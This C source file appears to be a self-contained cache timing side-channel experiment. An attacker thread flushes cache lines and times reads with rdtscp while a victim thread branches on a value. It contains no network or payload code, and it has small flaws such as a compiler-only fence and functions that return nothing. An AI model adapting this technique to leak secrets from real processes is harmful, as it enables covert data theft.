#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <pthread.h>

void flush(void *p);
uint64_t rdtsc();
void fence();

inline void flush(void *p){
	__asm__ volatile ("clflush 0(%0)" : : "r" (p) : "rax");
}

inline uint64_t rdtsc(){
	uint64_t a, d;
	__asm__ volatile ("rdtscp" : "=a" (a), "=d" (d));
	a = (d<<32) | a;
	return a;
}

inline void fence(){
	__asm__ volatile ("": : : "memory");
}


static int (*p)();
static int temp1;
static int temp2;
static int temp3;
static int temp4;
static int temp5;
static int temp6;
static int temp7;
static int temp8;
static int temp9;
static int tempa;
static int tempb;
static int tempc;
static int tempd;
static int tempe;
static int tempf;
static int tempg;
static int a[64];
static int sec = 1;
static int sid[64];
static int b[64];

int func3(int x){
	if(x<a[0])
		sec= sec;
	else
		sid[63]=sid[63];
}

int attack(){
	uint64_t start,end;

	flush(&sec);
	flush(&sid[63]);
	flush(&a[0]);
	flush(&b[40]);
	fence();
	sleep(1);

	printf("countering.\n");
	a[20]=0;
	start=0;
	end=0;

	fence();
	start=rdtsc();
	a[20]=sec;
	end=rdtsc();
	b[41]=(int)(end-start);
	printf("%d\t", b[41]);

	fence();
	start=rdtsc();
	a[20]=sid[63];
	end=rdtsc();
	b[42]=(int)(end-start);
	b[43]+=b[42]<100;
	printf("%d\t%d\n", b[42],b[43]);
}

int victim(){

	sleep(1);
	func3(5);
}

int main(int argc, char const *argv[])
{
	int ret_1,ret_2;
	a[0]=10;
	b[40]=0;
	b[41]=0;
	b[42]=0;

	for (int i=0; i<1; i++){
		pthread_t thread_1,thread_2;
		ret_1 = pthread_create(&thread_1,NULL,(void*)attack,NULL);
		ret_2 = pthread_create(&thread_2,NULL,(void*)victim,NULL);

		pthread_join(thread_1,NULL);
		pthread_join(thread_2,NULL);
	}

	return 0;
}
